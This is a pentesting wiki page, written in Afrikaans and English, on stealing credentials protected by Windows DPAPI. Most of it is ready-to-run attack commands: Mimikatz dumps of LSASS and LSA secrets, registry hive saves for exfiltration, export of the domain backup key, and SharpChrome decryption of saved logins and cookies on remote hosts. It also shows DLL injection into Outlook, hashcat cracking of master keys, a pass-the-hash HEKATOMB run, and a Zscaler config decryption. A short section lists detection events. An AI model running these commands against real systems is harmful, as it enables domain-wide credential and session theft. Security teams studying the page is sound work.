# DPAPI - Wagwoorde onttrek

{{#include ../../banners/hacktricks-training.md}}



## Wat is DPAPI

Die Data Protection API (DPAPI) word hoofsaaklik binne die Windows-bedryfstelsel gebruik vir die **symmetric encryption of asymmetric private keys**, deur gebruiker- of stelselgeheime as 'n belangrike bron van entropy te gebruik. Hierdie benadering vereenvoudig encryption vir developers deur hulle in staat te stel om data te encrypt met 'n sleutel wat van die gebruiker se logon-geheime afgelei is of, vir stelsel-encryption, die stelsel se domain authentication secrets, en skakel dus die behoefte uit vir developers om self die protection van die encryption-sleutel te bestuur.

Die algemeenste manier om DPAPI te gebruik, is deur die **`CryptProtectData` en `CryptUnprotectData`**-funksies, wat applications toelaat om data veilig te encrypt en decrypt met die sessie van die proses wat tans aangemeld is. Dit beteken dat die encrypted data slegs deur dieselfde gebruiker of stelsel wat dit encrypted het, gedecrypt kan word.

Daarbenewens aanvaar hierdie funksies ook 'n **`entropy`-parameter**, wat tydens encryption en decryption gebruik sal word; om dus iets te decrypt wat met hierdie parameter encrypted is, moet jy dieselfde entropy-waarde verskaf wat tydens encryption gebruik is.

### Users key generation

Die DPAPI genereer 'n unieke sleutel (genoem **`pre-key`**) vir elke gebruiker gebaseer op hul credentials. Hierdie sleutel word van die gebruiker se password en ander faktore afgelei, en die algoritme hang van die tipe gebruiker af, maar eindig as 'n SHA1. Byvoorbeeld, vir domain users, **hang dit van die gebruiker se NTLM hash af**.

Dit is besonder interessant omdat, indien 'n attacker die gebruiker se password hash kan bekom, hulle kan:

- **Enige data decrypt wat met DPAPI** met daardie gebruiker se sleutel encrypted is, sonder om enige API te kontak
- Probeer om die **password** offline te **crack** deur die geldige DPAPI-sleutel te probeer genereer

Daarbenewens word 'n nuwe **master key** gegenereer elke keer wanneer data deur 'n gebruiker met DPAPI encrypted word. Hierdie master key is die een wat werklik gebruik word om data te encrypt. Elke master key word met 'n **GUID** (Globally Unique Identifier) voorsien wat dit identifiseer.

Die master keys word in die **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**-directory gestoor, waar `{SID}` die Security Identifier van daardie gebruiker is. Die master key word encrypted gestoor deur die gebruiker se **`pre-key`** en ook deur 'n **domain backup key** vir recovery (dus word dieselfde sleutel 2 keer encrypted gestoor deur 2 verskillende passwords).

Let daarop dat die **domain key wat gebruik word om die master key te encrypt in die domain controllers is en nooit verander nie**, dus, indien 'n attacker toegang tot die domain controller het, kan hulle die domain backup key retrieve en die master keys van alle gebruikers in die domain decrypt.<sup>[[2]](#references)</sup>

Die encrypted blobs bevat die **GUID van die master key** wat gebruik is om die data binne hul headers te encrypt.

> [!TIP]
> DPAPI encrypted blobs begin met **`01 00 00 00`**

Vind master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk:

![Wat is DPAPI - Users key generation: Dit is hoe ’n klomp Master Keys van ’n gebruiker sal lyk](<../../images/image (1121).png>)

### Machine/System key generation

Dit is die key wat die machine gebruik om data te enkripteer. Dit is gebaseer op die **DPAPI_SYSTEM LSA secret**, wat ’n spesiale key is waartoe slegs die SYSTEM-user toegang het. Hierdie key word gebruik om data te enkripteer wat vir die stelsel self toeganklik moet wees, soos machine-level credentials of system-wide secrets.<sup>[[2]](#references)</sup>

Let daarop dat hierdie keys **nie ’n domain backup het nie**, en dus slegs plaaslik toeganklik is:

- **Mimikatz** kan toegang daartoe kry deur LSA secrets te dump met die command: `mimikatz lsadump::secrets`
- Die secret word binne die registry gestoor, dus kan ’n administrator die **DACL permissions wysig om toegang daartoe te verkry**. Die registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction from registry hives is ook moontlik. Byvoorbeeld, as ’n administrator op die target, save die hives en exfiltrate dit:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Voer dan op jou analysis box die DPAPI_SYSTEM LSA secret uit die hives terug en gebruik dit om machine-scope blobs te decrypt (scheduled task passwords, service credentials, Wi-Fi-profiele, ens.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data beskerm deur DPAPI

Onder die persoonlike data wat deur DPAPI beskerm word, is:

- Windows creds
- Internet Explorer en Google Chrome se wagwoorde en outo-voltooiingsdata
- E-pos- en interne FTP-rekeningwagwoorde vir toepassings soos Outlook en Windows Mail
- Wagwoorde vir gedeelde vouers, hulpbronne, draadlose netwerke en Windows Vault, insluitend encryption keys
- Wagwoorde vir remote desktop-verbindings, .NET Passport en private keys vir verskeie encryption- en authentication-doeleindes
- Network-wagwoorde wat deur Credential Manager bestuur word, asook persoonlike data in toepassings wat CryptProtectData gebruik, soos Skype, MSN messenger en meer
- Encrypted blobs binne die register
- ...

Stelselbeskermde data sluit in:
- Wifi-wagwoorde
- Scheduled task-wagwoorde
- ...

### Opsies vir master key-ekstraksie

- As die gebruiker domain admin-privileges het, kan hulle toegang tot die **domain backup key** kry om alle user master keys in die domain te decrypt:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Met plaaslike admin-regte is dit moontlik om toegang tot die **LSASS-geheue** te verkry om die DPAPI-hoofsleutels van alle aangemelde gebruikers en die SYSTEM-sleutel te onttrek.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- As die gebruiker plaaslike admin-regte het, kan hulle toegang tot die **DPAPI_SYSTEM LSA secret** verkry om die masjien se master keys te decrypt:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- As die wagwoord of NTLM-hash van die gebruiker bekend is, kan jy **die gebruiker se master keys direk decrypt**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- As jy in 'n sessie as die gebruiker is, is dit moontlik om die DC vir die **backup key om die master keys met RPC te decrypt** te vra. As jy 'n plaaslike admin is en die gebruiker aangemeld is, kan jy sy **session token steel** hiervoor:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Lys Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Toegang tot DPAPI-geënkripteerde data

### Vind DPAPI-geënkripteerde data

Algemene lêers wat deur gebruikers **beskerm** word, is in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Kyk ook daarna deur `\Roaming\` na `\Local\` in die bogenoemde paaie te verander.

Enumeration-voorbeelde:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kan DPAPI-geënkripteerde blobs in die lêerstelsel, register en B64-blobs vind:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Let daarop dat [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (van dieselfde repo) gebruik kan word om sensitiewe data soos cookies met DPAPI te decrypt.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron vinnige resepte (SharpChrome)

- Huidige gebruiker, interaktiewe decryption van gestoorde logins/cookies (werk selfs met Chrome 127+ app-bound cookies omdat die ekstra sleutel uit die gebruiker se Credential Manager opgelos word wanneer dit in gebruiker-konteks uitgevoer word):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Offline-analise wanneer jy slegs lêers het. Onttrek eers die AES state key uit die profiel se "Local State" en gebruik dit dan om die cookie DB te decrypt:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domeinwye/afgeleë triage wanneer jy die DPAPI-domeinrugsteunsleutel (PVK) en admin op die teikengasheerstelsel het:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- As jy ’n gebruiker se DPAPI prekey/credkey (van LSASS) het, kan jy wagwoordkraking oorslaan en profieldata direk dekripteer:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Nuwer Chrome/Edge builds kan sekere cookies met "App-Bound"-encryption stoor. Offline decryption van daardie spesifieke cookies is nie moontlik sonder die bykomende app-bound key nie; voer SharpChrome onder die target user context uit om dit outomaties op te haal. Sien die Chrome security blog post waarna hieronder verwys word.<sup>[[5]](#references)</sup>

### Toegangssleutels en data

- **Gebruik SharpDPAPI** om credentials uit DPAPI-encrypted files van die huidige sessie te verkry:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Kry credentials-inligting** soos die encrypted data en die guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Kry toegang tot masterkeys**:

Dekripteer ’n masterkey van ’n gebruiker wat die **domain backup key** via RPC aanvra:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir masterkey-dekripsie (let daarop dat dit moontlik is om `/rpc` te gebruik om die domein se backup key te verkry, `/password` om ’n plaintext password te gebruik, of `/pvk` om ’n DPAPI-domein se private key-lêer te spesifiseer...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dekripteer data met behulp van een masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Die **SharpDPAPI**-tool ondersteun ook hierdie argumente vir `credentials|vaults|rdg|keepass|triage|blob|ps`-dekripsie (let op dat dit moontlik is om `/rpc` te gebruik om die domein se backup key te kry, `/password` om ’n plaintext-wagwoord te gebruik, `/pvk` om ’n DPAPI-domein-private sleutel-lêer te spesifiseer, en `/unprotect` om die huidige gebruiker se sessie te gebruik...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Gebruik ’n DPAPI prekey/credkey direk (geen wagwoord nodig nie)

As jy LSASS kan dump, stel Mimikatz dikwels ’n DPAPI-sleutel per aanmelding bloot wat gebruik kan word om die gebruiker se masterkeys te dekripteer sonder om die plaintext-wagwoord te ken. Gee hierdie waarde direk aan die tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Dekripteer sekere data met behulp van die **huidige gebruikersessie**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Offline decryption met Impacket dpapi.py

As jy die slagoffer se gebruiker se SID en wagwoord (of NT hash) het, kan jy DPAPI masterkeys en Credential Manager-blobs volledig offline dekripteer deur Impacket se dpapi.py te gebruik.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifiseer artefakte op skyf:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Ooreenstemmende masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- As file transfer tooling onbetroubaar is, base64 die lêers on-host en kopieer die uitvoer:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Ontsyfer die masterkey met die gebruiker se SID en password/hash:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Gebruik die decrypted masterkey om die credential blob te decrypt:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Hierdie workflow herwin dikwels domeingeloofsbriewe wat deur programme gestoor word wat die Windows Credential Manager gebruik, insluitend administratiewe rekeninge (bv. `*_adm`).

---

### Hantering van Opsionele Entropy ("Third-party entropy")

Sommige programme stuur ’n bykomende **entropy**-waarde na `CryptProtectData`. Sonder hierdie waarde kan die blob nie gedekripteer word nie, selfs al is die korrekte masterkey bekend. Dit is dus noodsaaklik om die entropy te bekom wanneer geloofsbriewe geteiken word wat op hierdie manier beskerm word (bv. Microsoft Outlook en sommige VPN-clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) is ’n user-mode DLL wat die DPAPI-funksies binne die teikenproses hook en enige opsionele entropy wat verskaf word, deursigtig aanteken. Deur EntropyCapture in **DLL-injection**-modus teen prosesse soos `outlook.exe` of `vpnclient.exe` te laat loop, word ’n lêer geskep wat elke entropy-buffer aan die oproepende proses en blob koppel. Die vasgelegde entropy kan later aan **SharpDPAPI** (`/entropy:`) of **Mimikatz** (`/entropy:<file>`) verskaf word om die data te dekripteer.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft het ’n **context 3** masterkey-formaat bekendgestel vanaf Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desember 2023) het hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) en **22102** (context 3) bygevoeg, wat GPU-versnelde cracking van user passwords direk vanaf die masterkey-lêer moontlik maak. Aanvallers kan dus word-list- of brute-force-aanvalle uitvoer sonder om met die target system te interaksie hê.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) outomatiseer die proses:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Die tool kan ook Credential- en Vault-blobs parseer, dit met gekraakte sleutels decrypt en cleartext-wagwoorde uitvoer.<sup>[[8]](#references)</sup>


### Kry toegang tot data op ander masjiene

In **SharpDPAPI and SharpChrome** kan jy die **`/server:HOST`**-opsie aandui om toegang tot ’n afstandmasjien se data te verkry. Natuurlik moet jy toegang tot daardie masjien hê, en in die volgende voorbeeld word aanvaar dat die **domein se backup encryption key bekend is**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Ander tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) is 'n tool wat die extraction van alle users en computers uit die LDAP-directory en die extraction van die domeinbeheerder se backup key deur RPC outomatiseer. Die script sal dan alle computers se IP-adresse resolve en 'n smbclient op alle computers uitvoer om alle DPAPI blobs van alle users te bekom en alles met die domein se backup key te decrypt.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Met die lys van computers wat uit LDAP geëxtract is, kan jy elke subnetwerk vind, selfs al het jy nie daarvan geweet nie!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kan secrets wat deur DPAPI beskerm word outomaties dump. Die 2.x-release het die volgende bekendgestel:<sup>[[9]](#references)</sup>

* Parallelle collection van blobs vanaf honderde hosts
* Parsing van **context 3** masterkeys en outomatiese Hashcat cracking-integrasie
* Ondersteuning vir Chrome se "App-Bound"-encrypted cookies (sien volgende afdeling)
* 'n Nuwe **`--snapshot`**-mode om endpoints herhaaldelik te poll en nuutgeskepte blobs te diff

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) is 'n C#-parser vir masterkey/credential/vault-lêers wat Hashcat/JtR-formate kan uitvoer en opsioneel cracking outomaties kan uitvoer. Dit ondersteun machine- en user-masterkey-formate volledig tot en met Windows 11 24H1.<sup>[[8]](#references)</sup>


## Algemene opsporings

- Toegang tot lêers in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` en ander DPAPI-verwante directories.
- Veral vanaf 'n network share soos **C$** of **ADMIN$**.
- Gebruik van **Mimikatz**, **SharpDPAPI** of soortgelyke tooling om toegang tot LSASS-geheue te verkry of masterkeys te dump.
- Event **4662**: *'n Operasie is op 'n objek uitgevoer* – kan met toegang tot die **`BCKUPKEY`**-objek gekorreleer word.
- Event **4673/4674** wanneer 'n proses *SeTrustedCredManAccessPrivilege* (Credential Manager) versoek

---
### Kwesbaarhede & ekosisteemveranderinge 2023-2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). 'n Aanvaller met network access kon 'n domeinlid mislei om 'n kwaadwillige DPAPI backup key te retrieve, wat decryption van user-masterkeys moontlik gemaak het. Dit is in die November 2023 cumulative update gepatch – administrators moet verseker dat DCs en workstations volledig gepatch is.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound”-cookie-encryption** (Julie 2024) het die legacy DPAPI-only protection vervang met 'n addisionele key wat onder die user se **Credential Manager** gestoor word. Offline decryption van cookies vereis nou beide die DPAPI-masterkey en die **GCM-wrapped app-bound key**. SharpChrome v2.3 en DonPAPI 2.x kan die ekstra key recover wanneer dit met user context loop.<sup>[[5]](#references)</sup>


### Gevallestudie: Zscaler Client Connector – Pasgemaakte Entropy Afgelei van SID

Zscaler Client Connector stoor verskeie configuration-lêers onder `C:\ProgramData\Zscaler` (bv. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Elke lêer is met **DPAPI (Machine scope)** encrypted, maar die vendor verskaf **custom entropy** wat *runtime bereken* word in plaas daarvan om op die skyf gestoor te word.<sup>[[1]](#references)</sup>

Die entropy word uit twee elements herbou:

1. 'n Hard-coded secret wat binne `ZSACredentialProvider.dll` ingebed is.
2. Die **SID** van die Windows-account waaraan die configuration behoort.

Die algoritme wat deur die DLL geïmplementeer word, is ekwivalent aan:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Omdat die geheim in ’n DLL ingebed is wat vanaf die skyf gelees kan word, kan **enige plaaslike aanvaller met SYSTEM-regte die entropy vir enige SID hergenereer** en die blobs offline dekripteer:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Dekripsie lewer die volledige JSON-konfigurasie op, insluitend elke **device posture check** en die verwagte waarde daarvan – inligting wat baie waardevol is wanneer client-side bypasses probeer word.

> WENK: die ander geënkripteerde artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) word met DPAPI **sonder** entropie (`16` nulgrepe) beskerm. Hulle kan dus direk met `ProtectedData.Unprotect` gedekripteer word sodra SYSTEM-voorregte verkry is.

## Verwysings

- [1] [Synacktiv – Kan jy jou zero trust vertrou? Omseiling van Zscaler-posturekontroles](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Sekuriteitsanalise en dataherwinning in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lees van DPAPI-geënkripteerde geheime met Mimikatz en C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing-kwesbaarheid](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Verbetering van die sekuriteit van Chrome-koekies op Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Eenvoudige onttrekking van opsionele DPAPI-entropie](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6-vrystellingsnotas](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub-bewaarplek](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI-projekblad](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL-misbruik, KeePassXC Argon2-kraking en DPAPI-dekripsie tot DC-admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Gebruik en opsies](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
